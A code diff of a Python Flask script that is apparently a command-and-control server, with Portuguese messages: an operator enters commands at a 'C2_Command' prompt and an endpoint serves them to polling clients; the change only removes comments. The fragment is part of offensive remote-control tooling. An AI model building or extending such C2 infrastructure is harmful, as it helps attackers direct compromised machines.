@@ -46,7 +46,6 @@ def loopback():
         latest_command["cmd"] = ""                          # Clear the command after sending it
         return jsonify({"command": command_to_send})
 
-# Função para a interface de comando do operador
 def operator_command_interface():
     global latest_command
 
@@ -56,14 +55,14 @@ def operator_command_interface():
             cmd = input("C2_Command > ")
             if cmd.lower() == "exit":
                 print("[!] Desligando o servidor C2. Pressione Ctrl+C na janela do Flask para sair completamente.")
-                os._exit(0) # Força a saída de todas as threads
+                os._exit(0)
             latest_command["cmd"] = cmd
             print(f"[+] Comando definido: '{cmd}'")
-        except EOFError: # Lida com Ctrl+D
+        except EOFError:
             print("\n[!] EOF recebido. Digite 'exit' para sair.")
-        except KeyboardInterrupt: # Lida com Ctrl+C
+        except KeyboardInterrupt:
             print("\n[!] Ctrl+C detectado. Digite 'exit' para sair ou pressione Ctrl+C novamente para forçar.")
-            continue # Permite que o loop continue para o 'exit' ou outro Ctrl+C
+            continue
 
 def run_flask_app():
     app.run(host=HOST, port=PORT, debug=False, use_reloader=False)
